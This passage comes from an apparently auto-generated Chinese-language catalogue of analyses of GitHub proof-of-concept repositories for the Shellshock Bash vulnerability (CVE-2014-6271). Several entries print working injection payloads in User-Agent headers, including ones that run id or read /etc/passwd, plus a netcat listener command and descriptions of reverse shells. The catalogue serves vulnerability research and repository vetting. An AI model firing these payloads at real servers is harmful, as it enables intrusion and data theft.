*   Dockerfile：用于构建Docker镜像，升级Bash到4.3，并应用patch。
*   README.md：包含关于漏洞的信息以及镜像的来源。
*   `build/test.cgi`：一个简单的CGI脚本，用于触发漏洞。这个脚本本身不包含任何恶意代码,只是用于展示环境变量。

虽然大部分代码用于搭建漏洞测试环境，但仍存在潜在的投毒风险。Dockerfile中使用了`wget`从外部源下载bash源码和patch。尽管URL看起来是官方的GNU源，但如果这些源被劫持，则可能被替换为包含恶意代码的版本。此外，即使源代码没有被篡改，应用patch的过程也可能引入意料之外的问题。

综合来看，投毒风险较低，大约为10%。主要风险在于对外部源的依赖，以及patch应用过程中的潜在问题。

**3. 利用方式：**

ShellShock漏洞的利用方式如下：

1.  **攻击者构造包含恶意代码的环境变量。** 恶意代码被嵌入到函数定义之后，例如：`(){ :; }; command`。
2.  **攻击者通过某种方式将该环境变量传递给Bash。** 常见的场景包括：
    *   **CGI脚本：** 攻击者可以通过HTTP请求头设置环境变量，当Web服务器调用CGI脚本时，会将这些环境变量传递给Bash解释器。
    *   **OpenSSH的ForceCommand功能：** 攻击者可以通过SSH连接，利用ForceCommand功能执行命令，并将恶意环境变量传递给Bash。
    *   **DHCP客户端：** 在某些情况下，DHCP客户端会执行脚本，并将DHCP服务器提供的环境变量传递给Bash。
3.  **Bash执行包含恶意代码的环境变量。** 当Bash遇到函数定义后的trailing strings时，会将其作为命令执行，从而导致远程代码执行。

例如，通过CGI脚本利用该漏洞的Payload可能如下所示：

```
GET /cgi-bin/test.cgi HTTP/1.1
User-Agent: () { :; }; /usr/bin/env
Host: target.com
```

该请求会将`User-Agent`头设置为包含恶意代码的环境变量，当Web服务器调用`test.cgi`脚本时，`/usr/bin/env`命令会被执行。

**项目地址:** [cved-sources/cve-2014-6271](https://github.com/cved-sources/cve-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #19

**来源**: [CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md](../2014/CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 4.3

**利用条件:** 目标系统使用CGI，OpenSSH等方式，且Bash版本在受影响范围内

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的、包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用的方式是：通过将包含函数定义的恶意字符串作为环境变量的值传递给Bash，Bash在解析这些环境变量时，会错误地执行函数定义后面的命令。漏洞利用代码分析：提供的Dockerfile构建了一个包含易受攻击的Bash版本（4.3.0）和Apache HTTP Server的Docker镜像。`safe.cgi`和`victim.cgi`脚本被添加到`/var/www/html/`目录下。`victim.cgi`使用易受攻击的Bash版本，而`safe.cgi` 使用修复后的版本（但提供的代码中，两个cgi都一样，都是直接输出helloworld）。攻击者可以通过修改User-Agent头，或者通过其他CGI变量传递恶意代码，从而在服务器上执行命令。根据readme.md的描述，向victim.cgi发送包含payload的User-Agent，可以触发漏洞。例如：

`User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id`

该漏洞利用的有效性较高，因为漏洞原理简单，且影响范围广泛。**投毒风险评估：**代码仓库中可能存在作者隐藏的恶意代码的风险较低，这里评估为1%。主要原因是：Dockerfile比较简单，只是构建了一个包含特定版本Bash和Apache HTTP Server的镜像，没有发现明显的后门代码。safe.cgi和victim.cgi 脚本本身也比较简单，只是输出“Hello world”，并没有包含任何可疑的逻辑。flagA文件只是一个标记文件，不包含任何可执行代码。虽然不能完全排除作者在镜像构建过程中隐藏恶意代码的可能性，但从目前的代码来看，这种可能性很小。

**利用方式总结：**

1.  **确定目标系统使用的Bash版本在受影响范围内（<=4.3）。**
2.  **找到一个可以设置环境变量的入口点，例如CGI脚本、OpenSSH的ForceCommand等。**
3.  **构造包含恶意代码的环境变量，例如：`() { :; }; /usr/bin/id`。**
4.  **将该环境变量传递给Bash。**
5.  **Bash解析环境变量时，会执行恶意代码。**

利用代码中的`victim.cgi`脚本是一个CGI入口点，攻击者可以通过修改HTTP请求头（例如User-Agent）来设置环境变量，从而触发漏洞。

**项目地址:** [cyberharsh/Shellbash-CVE-2014-6271](https://github.com/cyberharsh/Shellbash-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #20

**来源**: [CVE-2014-6271-hadrian3689_shellshock.md](../2014/CVE-2014-6271-hadrian3689_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** Bash <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过OpenSSH等方式设置环境变量

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的远程代码执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。

**有效性：**
提供的POC代码是有效的。该Python脚本利用Shellshock漏洞通过User-Agent头注入恶意Bash代码，从而在目标系统上执行命令，可以实现反向shell或伪交互式shell。

**投毒风险：**
该脚本主要功能是利用Shellshock漏洞，但代码中存在一定的投毒风险：
*   **风险点：** `shellshock.py`中的payload构造部分，即`payload = "() { :;}; echo; /bin/bash -c 'echo " + cmd + " | base64 -d | sh'"`。虽然脚本本身的目标是实现反向shell，但是攻击者可以修改`cmd`变量的内容，插入恶意的、非反向shell的代码，进行破坏或植入后门。
*   **缓解措施：** 使用者应仔细审查脚本内容，尤其是`cmd`变量的赋值部分，确保脚本执行的是预期操作，并且来自可信来源。
*   **投毒风险百分比:** 10%。主要是脚本中自定义命令的灵活性可能被滥用，并非恶意代码。大部分代码功能清晰，实现的是漏洞利用逻辑。

**利用方式：**
1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，Bash会执行函数定义后面的字符串。攻击者可以利用这个特性，在环境变量中注入恶意代码。
2.  **攻击方法：**
    *   **通过HTTP User-Agent头：** POC脚本通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量传递给服务器。如果服务器使用Bash处理User-Agent头（例如，通过CGI脚本），那么恶意代码就会被执行。
    *   **反向Shell：** 脚本通过构造Bash命令，建立与攻击者机器的反向TCP连接，从而获得目标系统的shell访问权限。
    *   **正向Shell (防火墙绕过)：** 脚本创建一个命名管道(FIFO)用于输入和输出，攻击者通过HTTP请求向管道写入命令，并读取管道的输出来实现交互式shell。这种方式可以绕过一些防火墙的限制。
3.  **利用条件：**
    *   目标系统运行着存在Shellshock漏洞的Bash版本。
    *   存在可以传递环境变量给Bash的途径，例如CGI脚本、OpenSSH的ForceCommand等。
    *   如果使用反向shell，目标系统需要能够连接到攻击者的机器。

**项目地址:** [hadrian3689/shellshock](https://github.com/hadrian3689/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #21

**来源**: [CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md](../2014/CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** Bash

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本、OpenSSH等利用入口，允许设置环境变量

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以构造包含恶意代码的环境变量，当Bash shell执行时，会将恶意代码一并执行，从而达到远程命令执行的目的。

**有效性：**

提供的POC代码是有效的，它演示了利用Shellshock漏洞的基本原理，即通过设置包含恶意代码的环境变量来执行任意命令。shellshock.c 文件通过提权后执行 bash 命令来证明改漏洞的利用。

**投毒风险：**

代码仓库中未发现明显的投毒代码。shellshock.c 只是简单的提权后执行了 bash 命令。

**利用方式：**

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值以函数定义开头，Bash会尝试解析并执行该函数定义之后的代码。如果攻击者能够控制环境变量的内容，就可以注入恶意的代码。

2.  **利用场景：**

    *   **CGI脚本：**  Web服务器在执行CGI脚本时，会将HTTP请求头中的某些字段作为环境变量传递给脚本。攻击者可以修改这些HTTP请求头，注入恶意代码。
    *   **OpenSSH：**  如果OpenSSH启用了`ForceCommand`功能，并且`ForceCommand`中使用了Bash shell，攻击者可以通过设置环境变量来执行命令。
    *   **DHCP客户端：**  某些DHCP客户端脚本会执行Bash shell，攻击者可以通过控制DHCP服务器，设置包含恶意代码的环境变量。

3.  **利用步骤：**

    a.  确定目标系统存在Bash shell，且版本小于等于4.3。
    b.  找到一个可以通过环境变量影响Bash执行的入口（例如CGI脚本）。
    c.  构造包含恶意代码的环境变量，例如：
        `export payload='() { ignored; }; /bin/cat /etc/passwd'`
    d.  将该环境变量传递给Bash shell执行。
    e.  如果漏洞存在，`/etc/passwd`文件的内容将被输出。

**项目地址:** [hanmin0512/CVE-2014-6271_pwnable](https://github.com/hanmin0512/CVE-2014-6271_pwnable)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #22

**来源**: [CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md](../2014/CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，且攻击者能够通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271（ShellShock）是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用方式主要依赖于Bash处理函数定义后尾随字符串的方式。攻击者可以将恶意代码嵌入到环境变量中，当Bash解析这些变量时，尾随的恶意代码会被执行。

**有效性评估：**
漏洞库信息和搜索结果均表明该漏洞真实存在且危害严重，存在大量可利用的场景。利用代码库中提供的文件看起来是GNU GPL许可证，本身不包含攻击代码，但实际漏洞利用需要构造特定的环境变量。

**投毒风险评估：**
提供的漏洞利用代码片段（LICENSE文件）本身不具备投毒性，它只是一个开源协议文件。投毒风险主要存在于漏洞利用的上下文和攻击者构造的恶意环境变量中。如果攻击者散布包含恶意代码的环境变量构造方法，可能会诱导用户执行有害操作。但仅分析提供的LICENSE文件，投毒风险极低，约为1%。

**利用方式分析：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/eject`。
2.  **触发Bash解析：** 寻找能够触发Bash解析这些环境变量的入口点。常见的入口点包括：
    *   OpenSSH的`ForceCommand`。
    *   Apache HTTP Server的`mod_cgi`和`mod_cgid`模块。
    *   DHCP客户端脚本。
    *   其他任何跨越权限边界并设置环境变量的Bash执行场景。
3.  **远程代码执行：** 当Bash解析包含恶意代码的环境变量时，嵌入的命令会被执行，导致远程代码执行。

根据搜索结果，该漏洞已存在多年，但由于其影响范围广泛，仍然值得关注。应及时更新Bash版本，并检查系统配置，避免受到攻击。

**项目地址:** [indiandragon/Shellshock-Vulnerability-Scan](https://github.com/indiandragon/Shellshock-Vulnerability-Scan)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #23

**来源**: [CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md](../2014/CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统权限获取

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash作为shell，且存在CGI脚本或允许通过环境变量传递命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。当Bash shell处理这些环境变量时，会在函数定义后执行嵌入的命令，从而导致安全风险。

**有效性：**

提供的PoC代码是有效的，它通过`pwn`库和`requests`库实现漏洞利用。该脚本通过构造包含恶意Bash代码的HTTP请求头（User-Agent, Cookie, Referer）发送到目标服务器，如果目标服务器存在CGI脚本且使用存在漏洞的Bash版本，则会执行恶意代码，并反弹shell到攻击者指定的IP地址和端口。

**投毒风险：**

该仓库中存在一定的投毒风险，风险评估为10%。虽然作者提供了免责声明，并且主要代码逻辑是为了利用Shellshock漏洞，但仍然存在潜在的后门或恶意修改的可能性，尽管看起来相对较低：
*   **依赖风险**: 依赖`pwn`和`requests`库，如果这些库被篡改，可能引入恶意代码。
*   **Payload定制**: Payload的构造方式可能被修改，引入额外的恶意行为。

**利用方式：**

1.  **确定目标：** 寻找运行CGI脚本的web服务器，或者其他任何可能通过环境变量传递命令给Bash的应用程序。
2.  **构造Payload：** 构造一个包含恶意Bash代码的环境变量，例如：`() { :;}; /bin/bash -c 'command'`。
3.  **传递Payload：** 通过HTTP请求头（User-Agent, Cookie, Referer）或者其他方式将payload作为环境变量传递给目标系统。
4.  **触发漏洞：** 当Bash shell处理包含恶意代码的环境变量时，会执行嵌入的命令。
5.  **获取权限：** 利用反弹shell或其他方式获取目标系统的控制权。

**项目地址:** [knightc0de/Shellshock_vuln_Exploit](https://github.com/knightc0de/Shellshock_vuln_Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #24

**来源**: [CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md](../2014/CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md)

## CVE-2014-6271-Apache-Debian Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本，且Apache配置允许执行CGI脚本，并且Bash版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271（Shellshock）是一个影响 GNU Bash 的高危漏洞。该漏洞源于 Bash 处理环境变量中函数定义后附加字符串的方式存在缺陷，允许远程攻击者通过构造特殊的环境变量来执行任意代码。

**有效性：**

根据提供的 PoC 代码（/tmp/47c4ac3d27239b789878e6360b54dc21/README.md），该 PoC 旨在演示如何在 Apache Debian 环境中利用 CVE-2014-6271 漏洞。它包含构建易受攻击的 Docker 镜像和 Kubernetes 清单的步骤，以及利用漏洞的演示。

PoC 代码的有效性通过以下事实得到证实：

*   它提供了一个明确的攻击向量：通过 `User-Agent` HTTP 头传递恶意构造的 Bash 函数定义。
*   它演示了如何获得受害容器上的 shell 访问权限。
*   它演示了如何在受害容器上修改 Web 页面内容。

因此，提供的 PoC 代码可以被认为是有效的。

**投毒风险：**

评估 PoC 代码的投毒风险表明，主要风险较低，约为 5%。

*   **高风险文件:** 位于`/tmp/47c4ac3d27239b789878e6360b54dc21/web-insecure/Dockerfile`，这个Dockerfile 用于构建包含漏洞环境，该漏洞是已知的，构建目的是用于演示验证，所以它不是投毒代码。
*   **低风险文件:** 其他文件（例如 web-secure 目录中的文件和 k8s 清单文件）似乎是良性的，并且用于设置安全的环境以进行比较或者演示。
*   **总体分析:**

虽然该存储库的目的是演示漏洞，但攻击者可能会修改 `web-insecure/Dockerfile` 以包含其他恶意软件或后门。用户在使用这些文件构建镜像时应谨慎。

**利用方式：**

利用 CVE-2014-6271 漏洞涉及以下步骤：

1.  **确定目标：**识别运行易受攻击的 Bash 版本的系统，该系统通常用于处理 Web 请求或 CGI 脚本。
2.  **构造攻击负载：**创建一个包含恶意 Bash 函数定义的特殊构造的环境变量。
3.  **传递攻击负载：**通过 HTTP 请求头（例如 `User-Agent`）或 CGI 脚本可以访问的任何其他环境变量将攻击负载传递到目标系统。
4.  **执行任意代码：**当 Bash 处理恶意环境变量时，它会执行其中嵌入的命令。

在提供的 PoC 代码中，利用方式如下：

1.  攻击者设置一个 netcat 监听器 (`nc -nvlp 5050`)。
2.  攻击者使用 curl 命令向易受攻击的 Web 服务发送一个 HTTP 请求，其中 `User-Agent` 头包含一个恶意的 Bash 函数定义。这个函数定义包含执行反向 shell 的命令，将 shell 连接到攻击者的 netcat 监听器。
3.  当 Web 服务（通常通过 CGI 脚本）执行 Bash 时，Bash 会处理恶意的 `User-Agent` 头，执行反向 shell 命令，并允许攻击者访问受害容器上的 shell。

**项目地址:** [mochizuki875/CVE-2014-6271-Apache-Debian](https://github.com/mochizuki875/CVE-2014-6271-Apache-Debian)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #25

**来源**: [CVE-2014-6271-moften_CVE-2014-6271.md](../2014/CVE-2014-6271-moften_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock漏洞扫描器

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许攻击者执行任意命令

**影响版本:** <= 4.3

**利用条件:** 目标系统运行存在漏洞的Bash版本，并且存在CGI脚本或其他方式通过环境变量调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过特制的 Bash 环境变量执行任意命令。漏洞存在于 Bash 处理函数定义后尾随字符串的方式中。 

**有效性：**
提供的PoC代码是一个Python脚本，用于扫描目标URL是否存在Shellshock漏洞。它通过发送包含恶意payload的User-Agent头部的HTTP请求到常见的CGI脚本路径，然后检查响应中是否包含特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断目标是否易受攻击。根据漏洞库信息和搜索结果，该漏洞利用方式是有效的。

**投毒风险：**
该仓库包含一个Python脚本和一个README.md文件。Python脚本的功能是发送包含特定payload的HTTP请求并检查响应。README.md文件仅包含项目名称和描述。
 *  投毒代码分析: 该python脚本主要功能是发送特定Header的请求到服务器端CGI脚本,存在以下潜在的投毒风险：
    *  **CGI脚本路径猜测：**脚本中包含一个常见的CGI脚本路径列表。如果攻击者控制了该列表，可以通过添加恶意CGI路径来欺骗扫描者，引导他们攻击不存在的或伪造的服务。
    *  **Payload修改：**虽然当前的payload是良性的，用于检测漏洞，但攻击者可能修改payload以执行恶意操作，例如上传后门或执行拒绝服务攻击。
    *  **扫描行为：** 扫描行为本身可能被目标系统检测为恶意活动，从而触发防御机制或记录扫描者的IP地址。
    *  **误报风险：**脚本依赖于特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断漏洞是否存在。如果目标服务器返回包含该字符串的响应，即使实际不存在漏洞，脚本也会报告为易受攻击。修改这个字串可以导致信息泄露或者权限提升,因此可能存在一定风险。

**利用方式：**
1.  **环境变量注入：** 攻击者构造一个包含恶意代码的 Bash 函数定义的环境变量。例如：`(){ :;}; /usr/bin/id`。
2.  **触发 Bash 执行：** 通过 CGI 脚本、OpenSSH 的 ForceCommand 功能、DHCP 客户端脚本等方式，将构造的包含恶意代码的环境变量传递给 Bash。
3.  **代码执行：** 当 Bash 执行上述环境变量时，由于漏洞，尾随在函数定义后的命令会被执行，从而实现远程代码执行。

**总结：**
该PoC代码利用了Shellshock漏洞，通过环境变量注入执行任意命令。漏洞影响范围广泛，修复难度较大，危害程度高。


**项目地址:** [moften/CVE-2014-6271](https://github.com/moften/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #26

**来源**: [CVE-2014-6271-mritunjay-k_CVE-2014-6271.md](../2014/CVE-2014-6271-mritunjay-k_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名ShellShock，是GNU Bash中的一个严重漏洞。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被传递给Bash执行的进程时，会导致远程代码执行。 

**有效性：** 提供的POC代码是有效的。它通过设置`User-Agent`头来传递恶意payload。如果目标URL指向一个CGI脚本，且该脚本使用Bash处理环境变量，那么攻击者就可以执行任意命令。POC代码还包含一个检查机制，如果URL不包含`/cgi-bin/status`，它会提示用户是否要添加该路径，这增加了攻击的灵活性。

**投毒风险：** 在提供的`exploit.py`和`README.md`文件中，没有发现任何明显的投毒代码。代码逻辑清晰，目标是利用ShellShock漏洞执行命令。没有发现作者尝试引入恶意行为，例如上传恶意文件、植入后门或窃取凭据。因此，投毒风险评估为0%。

**利用方式：** 

1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统，该系统需要具有某种暴露点，该暴露点允许通过环境变量注入的方式利用Bash。常见的暴露点包括CGI脚本、OpenSSH的`ForceCommand`特性以及某些DHCP客户端。
2.  **构造Payload：** 构造一个包含恶意代码的环境变量。Payload的形式通常为`() { :; }; <command>`。其中`<command>`是要执行的shell命令。
3.  **传递Payload：** 将构造的Payload作为环境变量传递给Bash。对于CGI脚本，这可以通过设置HTTP头的`User-Agent`字段来实现，如提供的POC代码所示。在其他场景中，可能需要使用其他方法来设置环境变量。
4.  **执行命令：** 当Bash执行接收到包含Payload的CGI脚本时，它会解析环境变量，触发漏洞，并执行注入的命令。
5.  **验证执行结果:** POC脚本会打印出`page`的内容,命令执行的结果将会嵌入到返回的内容中.

**综上所述：** 提供的POC代码利用了ShellShock漏洞，通过构造恶意环境变量并在目标系统上触发执行，实现了远程命令执行。虽然漏洞利用风险很高，但提供的代码本身没有发现投毒风险。

**项目地址:** [mritunjay-k/CVE-2014-6271](https://github.com/mritunjay-k/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #27

**来源**: [CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md](../2014/CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且攻击者能够控制环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的严重漏洞。该漏洞源于Bash处理环境变量中函数定义之后存在的字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被Bash解析时，就能执行任意命令。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2014-6271是一个经过验证的漏洞，具有较高的利用成功率。

提供的Dockerfile和相关文件构成了一个可以利用该漏洞的环境。Dockerfile设置了一个基于Debian Wheezy的Apache服务器，并部署了一个CGI脚本（vulnerable），该脚本会调用Bash。攻击者可以通过设置恶意的环境变量，然后向CGI脚本发送HTTP请求来触发漏洞，从而在服务器上执行任意命令。

**投毒风险：**

分析提供的文件，存在一定的投毒风险，约为10%。Dockerfile中从/packages安装了预先存在的软件包。虽然COPY指令本身没有明显的恶意代码，但有需要审核的地方：
1. Dockerfile 从 `/packages` 目录安装软件包，而软件包的具体内容没有给出。如果这些包由攻击者控制，可能包含恶意后门。
2. `vulnerable` CGI 脚本的内容需要仔细审查，如果脚本本身存在后门，则存在投毒风险
3. main.sh 的内容也需要确认, 是否有安装一些额外的包.

**利用方式：**

1.  **CGI脚本利用：**  最常见的利用方式是通过CGI脚本。攻击者向Web服务器发送包含恶意环境变量的HTTP请求。如果Web服务器配置为使用Bash执行CGI脚本，Bash将解析这些环境变量，导致恶意代码执行。
2.  **OpenSSH ForceCommand：**  如果OpenSSH配置了ForceCommand选项，攻击者可以通过修改环境变量来执行任意命令。
3.  **DHCP客户端：**  某些DHCP客户端在执行脚本时会设置环境变量，攻击者可以通过控制DHCP服务器来注入恶意环境变量。

总之，CVE-2014-6271是一个高危漏洞，利用简单，影响广泛。需要及时修补受影响的系统。


**项目地址:** [opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #28

**来源**: [CVE-2014-6271-rsherstnev_CVE-2014-6271.md](../2014/CVE-2014-6271-rsherstnev_CVE-2014-6271.md)

## CVE-2014-6271 - ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程命令执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统运行Bash且存在可利用的入口点，例如CGI脚本、OpenSSH ForceCommand等。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的远程命令执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。漏洞利用的核心在于Bash在处理函数定义后附加的字符串时存在缺陷。 

**有效性评估：**
提供的Python POC代码利用了ShellShock漏洞，其有效性较高。代码首先通过发送包含特定字符串（`HelloKittyFromN0rdeN!`）的请求头来检测目标系统是否存在漏洞。如果检测到漏洞，则进入交互式shell，允许攻击者执行任意命令。

**利用方式分析：**
1.  **漏洞检测：** POC首先发送一个HTTP请求，其中User-Agent、Referer和Cookie头都包含恶意的Bash代码。这段代码的目的是在受影响的Bash版本中执行`echo HelloKittyFromN0rdeN!`命令，从而验证漏洞是否存在。
2.  **命令执行：** 如果漏洞存在，POC会进入一个循环，允许攻击者输入命令。输入的命令会被Base64编码，然后插入到HTTP请求头中。服务器端的Bash会解码并执行这些命令。
3.  **向量：** 此POC利用HTTP请求头（User-Agent, Referer, Cookie）作为攻击向量，这些头通常会被传递给服务器并可能被Bash处理。

**投毒风险分析：**
POC代码主要功能是检测和利用ShellShock漏洞。分析代码后，发现潜在的投毒风险较低（约1%）。

*   **Base64编码：** 使用Base64编码命令可能会被认为是一种混淆手段，但这是为了确保命令在HTTP头中传输的安全性，并非恶意隐藏代码。
*   **第三方库：** POC使用了requests库，理论上存在requests库被篡改的风险。但是，requests是常用的Python库，被篡改的可能性极低。
*   **BASE64_PATH变量:** 该变量用于指定`base64`命令的路径,如果该路径被修改为恶意程序,会存在投毒风险,但原代码中该变量默认为`/usr/bin/base64`,属于正常路径. 
*   **风险点：** 主要风险集中在使用未经授权的服务器上执行任意命令，这本身就是漏洞利用的目的，而不是POC代码引入的额外风险。

**搜索引擎结果印证：**
搜索结果确认了CVE-2014-6271是ShellShock漏洞，并且是广泛存在的，有多种利用方式。这些结果也强调了该漏洞的严重性和潜在影响。

综上所述，该POC代码的有效性较高，投毒风险较低，主要用于检测和利用ShellShock漏洞，允许攻击者通过HTTP请求头在目标系统上执行任意命令。

**项目地址:** [rsherstnev/CVE-2014-6271](https://github.com/rsherstnev/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---



---

## POC #12

**来源**: [CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md](../2014/CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过HTTP Header设置环境变量，且Bash版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式存在缺陷，攻击者可以通过构造包含恶意代码的环境变量，当Bash执行相关程序时，恶意代码会被执行，从而实现远程命令执行。从漏洞库信息和搜索引擎结果来看，此漏洞影响广泛，修复不彻底，危害巨大。

**有效性：**
提供的Python POC代码利用了ShellShock漏洞。它构造了一个包含恶意Bash代码的User-Agent头，并向目标URI发送GET请求。如果目标URI是一个CGI脚本，或者其他任何调用Bash并使用该User-Agent头作为环境变量的应用程序，那么恶意的Bash代码就会被执行，从而建立反向shell。

**投毒风险：**
该仓库的投毒风险较低。虽然任何代码都可能包含恶意成分，但此POC代码相对简单，主要功能是利用已知的ShellShock漏洞。潜在的风险可能包括：

*   作者可能在反向shell的Payload中植入其他恶意命令。但通过代码审计，反向shell的Payload清晰可见，未发现隐藏的恶意代码。
*   该代码可能针对特定系统环境做了优化，如果攻击者不了解这些优化，可能会导致利用失败，或留下攻击痕迹。但这种“优化”也可以被视作一种隐蔽的攻击尝试。

综合评估，该代码存在恶意投毒的可能性较低，约为5%。这个百分比代表一种潜在的风险，需要仔细审查代码才能完全消除。

**利用方式：**
1.  **确定目标：** 找到运行受影响Bash版本的服务器，并确认存在可以通过HTTP头设置环境变量的CGI脚本或其他应用。
2.  **准备攻击环境：** 在攻击者机器上设置NetCat监听指定端口，等待反向shell连接：`ncat -lkvnp <attacker-port>`。
3.  **构造Payload：** 使用POC脚本，指定目标IP地址、URI、攻击者IP地址和监听端口。
